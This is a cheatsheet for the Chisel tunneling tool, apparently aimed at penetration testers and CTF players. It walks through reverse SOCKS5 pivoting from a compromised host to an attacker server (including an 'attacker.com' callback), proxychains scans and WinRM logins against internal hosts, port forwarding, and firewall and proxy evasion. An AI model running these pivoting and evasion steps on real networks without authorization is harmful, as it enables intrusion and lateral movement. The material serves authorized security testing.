# 🚇 Chisel - Complete Cheatsheet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)

```
   ██████╗██╗  ██╗██╗███████╗███████╗██╗     
  ██╔════╝██║  ██║██║██╔════╝██╔════╝██║     
  ██║     ███████║██║███████╗█████╗  ██║     
  ██║     ██╔══██║██║╚════██║██╔══╝  ██║     
  ╚██████╗██║  ██║██║███████║███████╗███████╗
   ╚═════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝
      Fast TCP/UDP Tunnel over HTTP via SSH
```

<p align="center">
  <img src="https://img.shields.io/badge/Chisel-Tunneling-orange?style=for-the-badge" alt="Chisel">
  <img src="https://img.shields.io/badge/HTTP_WebSocket-Evasion-blue?style=for-the-badge" alt="WebSocket">
  <img src="https://img.shields.io/badge/SOCKS5-Proxy-green?style=for-the-badge" alt="SOCKS5">
  <img src="https://img.shields.io/badge/Go-Portable-red?style=for-the-badge" alt="Go">
</p>

<p align="center">
  <b>⚡ Fast TCP/UDP tunnel transported over HTTP, secured via SSH, packaged as a single portable binary</b>
</p>

---

## 📋 Table of Contents

- [Introduction](#-introduction)
- [How It Works](#-how-it-works)
- [Installation](#-installation)
- [Architecture & Tunnel Modes](#-architecture--tunnel-modes)
- [Standard Pentest Setup: Reverse SOCKS5 Proxy](#-standard-pentest-setup-reverse-socks5-proxy)
  - [Step 1: Start Server on Attacker](#step-1-start-server-on-attacker)
  - [Step 2: Connect Client from Target](#step-2-connect-client-from-target)
  - [Step 3: Configure Proxychains](#step-3-configure-proxychains)
  - [Step 4: Execute Tools over the Tunnel](#step-4-execute-tools-over-the-tunnel)
- [Local Port Forwarding](#-local-port-forwarding)
- [Remote Port Forwarding (Catching Inbound Traffic)](#-remote-port-forwarding-catching-inbound-traffic)
- [Authentication & Fingerprint Pinning](#-authentication--fingerprint-pinning)
- [Egress Evasion & HTTP Proxy Chaining](#-egress-evasion--http-proxy-chaining)
- [Chisel vs Ligolo-ng vs SSH](#-chisel-vs-ligolo-ng-vs-ssh)
- [Quick Reference Table](#-quick-reference-table)
- [Tips & Best Practices](#-tips--best-practices)
- [Legal Disclaimer](#-legal-disclaimer)
- [Resources](#-resources)

---

## 🎯 Introduction

**Chisel** is an open-source, cross-platform tunneling tool written in Go that encapsulates secure SSH sessions within standard HTTP/WebSocket connections.

Because the traffic looks like standard HTTP/HTTPS or WebSocket communication on the wire, Chisel easily navigates through restrictive firewalls, Deep Packet Inspection (DPI) systems, and corporate web proxies that would normally block raw SSH or VPN traffic.

### Key Strengths

- 🚀 **Single Binary:** Contains both server and client in a standalone statically-compiled binary.
- 🛡️ **Firewall Evasion:** Tunnels over standard port 80/443 or WebSockets to blend into regular web traffic.
- 🔒 **Encrypted by Default:** Uses SSH crypto under the hood (ECDSA keys and AES-GCM).
- 🔄 **SOCKS5 & Port Forwarding:** Creates reverse SOCKS5 proxies or specific local/remote forwarded ports effortlessly.

---

## 🏗️ How It Works

```
+------------------------------------+                         +-----------------------------------+
|          Attacker Machine          |                         |       Compromised Target Host     |
|          (192.168.1.100)           |                         |            (Dual-homed)           |
|                                    |                         |                                   |
| [chisel server --reverse -p 8080]  | <==== HTTP/WebSocket == | [chisel client 192.168.1.100:8080 |
|               |                    |       (TCP Port 8080)   |                 R:1080:socks]     |
|               v                    |                         |                  |                |
|  Local Port 1080 (SOCKS5 Proxy)    |                         |                  v                |
|               |                    |                         |        Internal Network Interface |
|      [proxychains nmap]            |                         |            (172.16.1.0/24)        |
+------------------------------------+                         +-----------------------------------+
```

---

## 📥 Installation

### Kali Linux

```bash
sudo apt update && sudo apt install -y chisel
```

### From Source (Go)

```bash
go install github.com/jpillora/chisel@latest
```

### Download Precompiled Binaries

Download standalone binaries for Linux, Windows, and macOS from the official releases:

```bash
# Attacker Linux 64-bit
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gzip -d chisel_1.9.1_linux_amd64.gz && mv chisel_1.9.1_linux_amd64 chisel && chmod +x chisel

# Windows Target 64-bit
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
gzip -d chisel_1.9.1_windows_amd64.gz && mv chisel_1.9.1_windows_amd64 chisel.exe
```

---

## 🔄 Standard Pentest Setup: Reverse SOCKS5 Proxy

In standard penetration testing and CTFs, the target machine is behind NAT/firewalls and cannot accept direct inbound connections from you. You must create a **reverse SOCKS5 proxy**.

### Step 1: Start Server on Attacker

Start the Chisel server listening on port `8000` (or `443` for evasion) with reverse port forwarding allowed:

```bash
chisel server --reverse -p 8000 -v
```

### Step 2: Connect Client from Target

Execute the client on the compromised machine, connecting back to your attacker IP and opening a reverse SOCKS5 proxy:

#### Linux Target:
```bash
./chisel client 192.168.1.100:8000 R:1080:socks
```

#### Windows Target:
```powershell
.\chisel.exe client 192.168.1.100:8000 R:1080:socks
```

> **Result:** The Chisel server on your attacker machine opens port `1080` locally as a SOCKS5 proxy routed through the target!

### Step 3: Configure Proxychains

Edit `/etc/proxychains4.conf` (or `/etc/proxychains.conf`) on your attacker machine:

```ini
[ProxyList]
# protocol  host        port
socks5      127.0.0.1   1080
```

### Step 4: Execute Tools over the Tunnel

Prefix any tool with `proxychains` to route it through the internal compromised host:

```bash
# Nmap TCP Connect scan
proxychains nmap -sT -Pn -p 80,445,3389 172.16.1.50

# SMB authentication
proxychains crackmapexec smb 172.16.1.0/24 -u Administrator -p 'Password123'

# Evil-WinRM shell to an internal domain controller
proxychains evil-winrm -i 172.16.1.5 -u Administrator -p 'Password123'
```

---

## 🔀 Local Port Forwarding

Forward a specific internal port from behind the target directly to your local attacker machine without needing a full SOCKS proxy.

### Example: Access Internal Web Service (Port 80)

Server on attacker (`192.168.1.100:8000`):
```bash
chisel server --reverse -p 8000
```

Client on target:
```bash
# Forward target's internal localhost:80 to attacker's localhost:8080
./chisel client 192.168.1.100:8000 R:8080:127.0.0.1:80
```

Now browse to `http://127.0.0.1:8080` on your attacker machine to view the internal web server!

### Example: Expose Internal Database (MySQL 3306)

Client on target:
```bash
./chisel client 192.168.1.100:8000 R:3306:172.16.1.200:3306
```

Connect directly from your attacker terminal:
```bash
mysql -h 127.0.0.1 -P 3306 -u root -p
```

---

## 🌐 Remote Port Forwarding (Catching Inbound Traffic)

Expose a port on the target machine that routes back to a service on your attacker box (useful for serving payloads or catching callbacks).

```bash
# Target opens port 9000, sending incoming connections to attacker's 9000
./chisel client 192.168.1.100:8000 9000:127.0.0.1:9000
```

---

## 🔐 Authentication & Fingerprint Pinning

In live environments, open Chisel ports can be hijacked by unauthorized parties. Protect your tunnel with authentication:

### Authentication (`--auth`)

```bash
# Attacker server enforces credentials
chisel server --reverse -p 8443 --auth "pentestuser:ComplexPassw0rd!"

# Target client authenticates
./chisel client --auth "pentestuser:ComplexPassw0rd!" 192.168.1.100:8443 R:1080:socks
```

### Fingerprint Pinning (`--fingerprint`)

When the server starts, it prints its SSH public key fingerprint:
```
2026/10/29 20:00:00 server: Fingerprint 8a:1f:9c:...
```

Verify it on the client to prevent MITM interception:
```bash
./chisel client --fingerprint "8a:1f:9c:..." 192.168.1.100:8443 R:1080:socks
```

---

## 🛡️ Egress Evasion & HTTP Proxy Chaining

If the internal target can only access the internet through an authenticating corporate proxy:

```bash
# Route Chisel traffic through an upstream corporate proxy
./chisel client --proxy http://proxy.corp.local:8080 \
  --header "Proxy-Authorization: Basic dXNlcjpwYXNz" \
  https://attacker.com:443 R:1080:socks
```

---

## ⚖️ Chisel vs Ligolo-ng vs SSH

| Feature | Chisel | Ligolo-ng | SSH Tunneling |
|---------|--------|-----------|---------------|
| **Primary Method** | SOCKS5 & Port Forwarding | TUN Interface (VPN) | SOCKS5 & Port Forwarding |
| **Transport Protocol** | HTTP / WebSocket | Raw TLS | SSH (Port 22) |
| **Firewall Evasion** | ⭐⭐⭐⭐⭐ Exceptional | ⭐⭐⭐⭐ Very Good | ⭐⭐ Poor (Port 22 usually blocked) |
| **Requires Root/Admin**| ❌ No (Userland only) | ✅ Yes (To create TUN device) | ❌ No |
| **Nmap SYN Scan (`-sS`)**| ❌ No | ✅ Yes | ❌ No |
| **UDP Support** | Partial (via SOCKS5) | ✅ Full native UDP | ❌ Very limited |

---

## 📊 Quick Reference Table

| Mode | Command | Purpose |
|------|---------|---------|
| **Server (Reverse)** | `chisel server --reverse -p 8000` | Start reverse server listening on 8000 |
| **Client (Reverse SOCKS5)** | `chisel client <IP>:8000 R:1080:socks` | Create reverse SOCKS5 on attacker's port 1080 |
| **Client (Forward Port)** | `chisel client <IP>:8000 R:8080:127.0.0.1:80` | Map target's port 80 to attacker's 8080 |
| **Client (Expose Attacker Port)** | `chisel client <IP>:8000 4444:127.0.0.1:4444` | Open port 4444 on target routing to attacker |
| **Auth Server** | `chisel server --reverse --auth "u:p" -p 8000` | Require credentials from connecting clients |
| **Auth Client** | `chisel client --auth "u:p" <IP>:8000 R:socks` | Connect with credentials |
| **Keep-Alive Tuning** | `chisel client --keepalive 10s <IP>:8000 R:socks`| Prevent firewall idle session dropouts |

---

## 💡 Tips & Best Practices

1. **Use Port 443 for Maximum Evasion:**
   Firewalls often inspect traffic on arbitrary ports like 8000 or 8080. Running your Chisel server on port `443` ensures traffic looks identical to HTTPS WebSockets.
2. **Tune Proxychains Timeout:**
   If proxychains connections feel sluggish, edit `/etc/proxychains4.conf` and set:
   ```ini
   tcp_read_time_out 15000
   tcp_connect_time_out 8000
   ```
3. **No Root Privileges Required on Target:**
   Unlike VPN or TUN solutions, Chisel runs purely in user-space. You can run `chisel.exe` or `chisel` as low-privilege service accounts (`www-data`, `nobody`, standard Windows user).

---

## ⚠️ Legal Disclaimer

> **IMPORTANT:** Chisel is intended for authorized network testing, red team simulation, and systems administration. Deploying tunneling tools on unauthorized networks violates computer security laws.

---

## 📚 Resources

- [Chisel GitHub Repository](https://github.com/jpillora/chisel)
- [Proxychains-NG Project](https://github.com/rofl0r/proxychains-ng)
